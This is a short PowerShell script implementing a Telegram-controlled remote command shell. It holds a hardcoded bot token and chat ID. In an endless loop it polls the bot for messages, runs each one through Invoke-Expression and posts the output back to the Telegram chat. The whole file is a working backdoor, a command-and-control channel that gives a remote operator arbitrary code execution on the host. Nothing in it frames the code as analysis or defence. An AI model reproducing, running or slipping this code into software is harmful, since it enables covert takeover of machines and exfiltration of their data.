class TelegramBot {
    [string]$BotToken = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI"
    [string]$ChatID = "1320722707"
    [string]$ApiUrl
    
    TelegramBot() {
        $this.ApiUrl = "https://api.telegram.org/bot$($this.BotToken)/sendMessage"
    }
    
    SendMessage([string]$Message) {
        try {
            Invoke-RestMethod -Uri $this.ApiUrl -Method Post -Body @{ 
                chat_id = $this.ChatID 
                text = $Message 
            } -ContentType "application/x-www-form-urlencoded"
        } catch {
            Write-Host "Failed to send message: $_"
        }
    }
    
    [string] ReceiveMessage() {
        $updateUrl = "https://api.telegram.org/bot$($this.BotToken)/getUpdates"
        try {
            $response = Invoke-RestMethod -Uri $updateUrl -Method Get
            $messages = $response.result | Where-Object { $_.message.chat.id -eq $this.ChatID }
            if ($messages) {
                return $messages[-1].message.text
            }
        } catch {
            Write-Host "Failed to receive message: $_"
        }
        return ""
    }
    
    ProcessCommands() {
        while ($true) {
            $message = $this.ReceiveMessage()
            if ($message) {
                $output = Invoke-Expression $message | Out-String
                $this.SendMessage($output)
            }
            Start-Sleep -Seconds 5
        }
    }
}

$bot = [TelegramBot]::new()
$bot.SendMessage("Bot started!")
$bot.ProcessCommands()
